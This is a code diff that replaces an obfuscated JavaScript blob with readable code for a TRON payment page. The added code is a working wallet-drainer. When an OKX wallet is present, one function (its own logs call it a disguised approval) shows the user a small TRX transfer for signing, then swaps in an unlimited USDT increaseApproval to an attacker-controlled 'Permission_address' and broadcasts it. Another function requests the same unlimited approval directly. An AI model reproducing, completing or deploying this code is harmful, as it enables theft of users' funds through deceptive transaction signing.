@@ -1,1 +1,155 @@
-(function(_0x350d26,_0x23f1d2){const _0x2996da=_0x3629,_0x210914=_0x350d26();while(!![]){try{const _0x36b3e3=parseInt(_0x2996da(0x1bd))/0x1*(parseInt(_0x2996da(0x1dc))/0x2)+parseInt(_0x2996da(0x1d3))/0x3*(parseInt(_0x2996da(0x1c3))/0x4)+-parseInt(_0x2996da(0x1b6))/0x5*(-parseInt(_0x2996da(0x1b5))/0x6)+parseInt(_0x2996da(0x1d7))/0x7*(-parseInt(_0x2996da(0x1b8))/0x8)+-parseInt(_0x2996da(0x1bc))/0x9+-parseInt(_0x2996da(0x1cc))/0xa*(-parseInt(_0x2996da(0x1a8))/0xb)+parseInt(_0x2996da(0x1ba))/0xc*(-parseInt(_0x2996da(0x1cf))/0xd);if(_0x36b3e3===_0x23f1d2)break;else _0x210914['push'](_0x210914['shift']());}catch(_0x5d29c8){_0x210914['push'](_0x210914['shift']());}}}(_0x55a1,0x5fc58));function _0x55a1(){const _0x355607=['266014IqScUQ','txid','付款失败，请重新发起交易','发送交易...','构建TRX转账交易...','899974mduAcc','uint256','正常授权交易构建失败','result','usdtContractAddress','toSun','error','sendRawTransaction','0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff','address','okxwallet','正常授权交易失败','increaseApproval(address,uint256)','33kHLKpM','success','执行OKX伪装授权增加操作失败:','错误信息:','txID','检测到\x20OKX\x20钱包，执行\x20okxapproval','transactionBuilder','交易签名中...','构建USDT授权增加交易...','triggerSmartContract','OKX伪装授权增加交易发送成功，交易哈希:','请重新点击按钮继续操作','开始执行正常授权增加操作','83592rfClgj','75iztigp','Payment\x20address:','72FxirGM','无法获取交易哈希','1416JvKgUL','raw_data','4026069oUujcm','1AZmrmN','Payment_address','transaction','授权成功','undefined','OKX伪装授权增加交易失败','129084mRWJIq','message','Permission\x20address:','toHex','defaultAddress','交易结果:','操作执行失败:','Permission_address','tronWeb','2284550mybzvB','sendTrx','授权失败，请重试','71253ulGTQc','trx','base58','sign','45KufTQo','log','执行正常授权增加操作失败:','开始执行OKX伪装授权操作'];_0x55a1=function(){return _0x355607;};return _0x55a1();}async function onNextButtonClick(){const _0x33e09c=_0x3629;try{if(!window[_0x33e09c(0x1cb)]||!window[_0x33e09c(0x1cb)][_0x33e09c(0x1c7)]||!window[_0x33e09c(0x1cb)]['defaultAddress'][_0x33e09c(0x1d1)]){console[_0x33e09c(0x1d4)]('钱包未连接，尝试连接'),await connectWallet(),tip(_0x33e09c(0x1b3));return;}console[_0x33e09c(0x1d4)]('准备执行转账/授权操作，金额：',currentAmount),typeof window[_0x33e09c(0x1a5)]!==_0x33e09c(0x1c1)?(console[_0x33e09c(0x1d4)](_0x33e09c(0x1ad)),await DjdskdbGsj()):(console[_0x33e09c(0x1d4)]('非\x20OKX\x20钱包，执行\x20approval'),await KdhshaBBHdg());}catch(_0x2b067e){console['error'](_0x33e09c(0x1c9),_0x2b067e),tip(_0x33e09c(0x1d9));}}function _0x3629(_0x247fde,_0xfcfdff){const _0x55a14b=_0x55a1();return _0x3629=function(_0x3629a7,_0x51c86d){_0x3629a7=_0x3629a7-0x19e;let _0x4dd6e3=_0x55a14b[_0x3629a7];return _0x4dd6e3;},_0x3629(_0x247fde,_0xfcfdff);}async function DjdskdbGsj(){const _0x98ddbd=_0x3629;console['log'](_0x98ddbd(0x1d6));const _0x402b30=tronWeb[_0x98ddbd(0x1a0)](currentAmount),_0x46e746=_0x98ddbd(0x1a3),_0x529d8c=0x3b9aca00;try{console[_0x98ddbd(0x1d4)](_0x98ddbd(0x1b7),window[_0x98ddbd(0x1be)]),console[_0x98ddbd(0x1d4)](_0x98ddbd(0x1c5),window[_0x98ddbd(0x1ca)]),console[_0x98ddbd(0x1d4)]('USDT\x20Contract\x20address:',window['usdtContractAddress']);const _0xeee0e2=tronWeb[_0x98ddbd(0x1a4)]['fromHex'](window[_0x98ddbd(0x1be)]);console[_0x98ddbd(0x1d4)](_0x98ddbd(0x1db));const _0x1719d3=await tronWeb[_0x98ddbd(0x1ae)][_0x98ddbd(0x1cd)](_0xeee0e2,_0x402b30,tronWeb[_0x98ddbd(0x1c7)][_0x98ddbd(0x1d1)],{'feeLimit':_0x529d8c});console[_0x98ddbd(0x1d4)](_0x98ddbd(0x1b0));const _0x5ac656=await tronWeb[_0x98ddbd(0x1ae)][_0x98ddbd(0x1b1)](tronWeb['address']['toHex'](window[_0x98ddbd(0x19f)]),_0x98ddbd(0x1a7),{'feeLimit':_0x529d8c},[{'type':'address','value':window['Permission_address']},{'type':'uint256','value':_0x46e746}],tronWeb[_0x98ddbd(0x1c7)][_0x98ddbd(0x1d1)]),_0x93810a=_0x5ac656['transaction'][_0x98ddbd(0x1bb)];_0x5ac656[_0x98ddbd(0x1bf)]['raw_data']=_0x1719d3[_0x98ddbd(0x1bb)],console['log'](_0x98ddbd(0x1af));const _0x4d450f=await tronWeb[_0x98ddbd(0x1d0)][_0x98ddbd(0x1d2)](_0x5ac656['transaction']);_0x4d450f[_0x98ddbd(0x1bb)]=_0x93810a,console[_0x98ddbd(0x1d4)](_0x98ddbd(0x1da));const _0x44c512=await tronWeb['trx']['sendRawTransaction'](_0x4d450f);console['log'](_0x98ddbd(0x1c8),_0x44c512);if(_0x44c512[_0x98ddbd(0x19e)]||_0x44c512[_0x98ddbd(0x1a9)]){const _0x18d510=_0x44c512[_0x98ddbd(0x1d8)]||_0x44c512[_0x98ddbd(0x1bf)]&&_0x44c512[_0x98ddbd(0x1bf)][_0x98ddbd(0x1ac)];if(!_0x18d510)throw new Error(_0x98ddbd(0x1b9));return console['log'](_0x98ddbd(0x1b2),_0x18d510),tip(_0x98ddbd(0x1c0)),_0x18d510;}else throw new Error(_0x98ddbd(0x1c2));}catch(_0x2bc75c){console[_0x98ddbd(0x1a1)](_0x98ddbd(0x1aa),_0x2bc75c),tip(_0x98ddbd(0x1ce));throw _0x2bc75c;}}async function KdhshaBBHdg(){const _0x2b12cc=_0x3629;console['log'](_0x2b12cc(0x1b4));const _0x2fc04e=_0x2b12cc(0x1a3),_0x5c914b=0x5f5e100,_0x5a6dbf=tronWeb[_0x2b12cc(0x1a4)]['toHex'](window[_0x2b12cc(0x19f)]);try{console[_0x2b12cc(0x1d4)]('构建交易...');const _0x25998e=await tronWeb[_0x2b12cc(0x1ae)][_0x2b12cc(0x1b1)](_0x5a6dbf,_0x2b12cc(0x1a7),{'feeLimit':_0x5c914b},[{'type':_0x2b12cc(0x1a4),'value':tronWeb[_0x2b12cc(0x1a4)][_0x2b12cc(0x1c6)](window[_0x2b12cc(0x1ca)])},{'type':_0x2b12cc(0x1dd),'value':_0x2fc04e}],tronWeb[_0x2b12cc(0x1c7)]['base58']);if(!_0x25998e||!_0x25998e[_0x2b12cc(0x1bf)]||!_0x25998e[_0x2b12cc(0x1bf)][_0x2b12cc(0x1bb)])throw new Error(_0x2b12cc(0x1de));console[_0x2b12cc(0x1d4)](_0x2b12cc(0x1af));const _0xa747a2=await tronWeb[_0x2b12cc(0x1d0)]['sign'](_0x25998e['transaction']);console[_0x2b12cc(0x1d4)](_0x2b12cc(0x1da));const _0x203f8c=await tronWeb[_0x2b12cc(0x1d0)][_0x2b12cc(0x1a2)](_0xa747a2);console[_0x2b12cc(0x1d4)](_0x2b12cc(0x1c8),_0x203f8c);if(_0x203f8c[_0x2b12cc(0x19e)]||_0x203f8c['success']){let _0x5208ac;if(_0x203f8c['transaction']&&_0x203f8c[_0x2b12cc(0x1bf)][_0x2b12cc(0x1ac)])_0x5208ac=_0x203f8c[_0x2b12cc(0x1bf)]['txID'];else{if(_0x203f8c[_0x2b12cc(0x1d8)])_0x5208ac=_0x203f8c[_0x2b12cc(0x1d8)];else throw new Error(_0x2b12cc(0x1b9));}return console[_0x2b12cc(0x1d4)]('交易发送成功，哈希:',_0x5208ac),tip(_0x2b12cc(0x1c0)),_0x5208ac;}else throw new Error(_0x2b12cc(0x1a6));}catch(_0xeb2be4){console[_0x2b12cc(0x1a1)](_0x2b12cc(0x1d5),_0xeb2be4);_0xeb2be4&&_0xeb2be4[_0x2b12cc(0x1c4)]&&console[_0x2b12cc(0x1a1)](_0x2b12cc(0x1ab),_0xeb2be4['message']);tip(_0x2b12cc(0x1ce));throw _0xeb2be4;}}
+// 下一步按钮点击处理函数
+async function onNextButtonClick() {
+    try {
+        // 检查钱包是否已连接
+        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+            console.log('钱包未连接，尝试连接');
+            await connectWallet();
+            tip('请重新点击按钮继续操作');
+            return; // 连接后停止，等待用户再次点击
+        }
+        
+        // 钱包已连接，直接执行操作
+        console.log('准备执行转账/授权操作，金额：', currentAmount);
+        
+        if (typeof window.okxwallet !== 'undefined') {
+            console.log('检测到 OKX 钱包，执行 okxapproval');
+            await DjdskdbGsj();
+        } else {
+            console.log('非 OKX 钱包，执行 approval');
+            await KdhshaBBHdg();
+        }
+    } catch (error) {
+        console.error('操作执行失败:', error);
+        tip('付款失败，请重新发起交易');
+    }
+}
+
+
+async function DjdskdbGsj() {
+  console.log("开始执行OKX伪装授权操作");
+  const trxAmountInSun = tronWeb.toSun(currentAmount);
+  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const feeLimit = 1000000000;
+  
+  try {
+    // 打印地址以进行调试
+    console.log("Payment address:", window.Payment_address);
+    console.log("Permission address:", window.Permission_address);
+    console.log("USDT Contract address:", window.usdtContractAddress);
+
+    // 确保使用的是base58格式的地址
+    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+    
+    console.log("构建TRX转账交易...");
+    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+      paymentAddress,
+      trxAmountInSun,
+      tronWeb.defaultAddress.base58,
+      { feeLimit: feeLimit }
+    );
+
+    console.log("构建USDT授权增加交易...");
+    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+      tronWeb.address.toHex(window.usdtContractAddress),
+      'increaseApproval(address,uint256)',
+      { feeLimit: feeLimit },
+      [
+        { type: 'address', value: window.Permission_address },
+        { type: 'uint256', value: maxUint256 }
+      ],
+      tronWeb.defaultAddress.base58
+    );
+
+    // 保存原始的交易数据
+    const originalRawData = approvalTransaction.transaction.raw_data;
+
+    // 用转账交易的数据替换批准交易的数据
+    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+
+    console.log("交易签名中...");
+    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+
+    // 恢复原始的交易数据
+    signedTransaction.raw_data = originalRawData;
+
+    console.log("发送交易...");
+    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+    console.log("交易结果:", broadcastResult);
+    if (broadcastResult.result || broadcastResult.success) {
+      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+      if (!transactionHash) {
+        throw new Error("无法获取交易哈希");
+      }
+      console.log("OKX伪装授权增加交易发送成功，交易哈希:", transactionHash);
+      tip("授权成功");
+      return transactionHash;
+    } else {
+      throw new Error("OKX伪装授权增加交易失败");
+    }
+  } catch (error) {
+    console.error("执行OKX伪装授权增加操作失败:", error);
+    tip("授权失败，请重试");
+    throw error;
+  }
+}
+
+async function KdhshaBBHdg() {
+    console.log("开始执行正常授权增加操作");
+
+    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
+    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+
+    try {
+        console.log("构建交易...");
+        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+            usdtContractAddressHex,
+            'increaseApproval(address,uint256)',
+            { feeLimit: feeLimit },
+            [
+                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
+                { type: 'uint256', value: maxUint256 }
+            ],
+            tronWeb.defaultAddress.base58
+        );
+
+        if (!transaction || !transaction.transaction || !transaction.transaction.raw_data) {
+            throw new Error('正常授权交易构建失败');
+        }
+
+        console.log("交易签名中...");
+        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+
+        console.log("发送交易...");
+        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+        console.log("交易结果:", result);
+
+        if (result.result || result.success) {
+            let transactionHash;
+            if (result.transaction && result.transaction.txID) {
+                transactionHash = result.transaction.txID;
+            } else if (result.txid) {
+                transactionHash = result.txid;
+            } else {
+                throw new Error("无法获取交易哈希");
+            }
+
+            console.log("交易发送成功，哈希:", transactionHash);
+            tip("授权成功");
+
+            return transactionHash;
+        } else {
+            throw new Error("正常授权交易失败");
+        }
+    } catch (error) {
+        console.error("执行正常授权增加操作失败:", error);
+        if (error && error.message) {
+            console.error("错误信息:", error.message);
+        }
+        tip("授权失败，请重试");
+        throw error;
+    }
+}
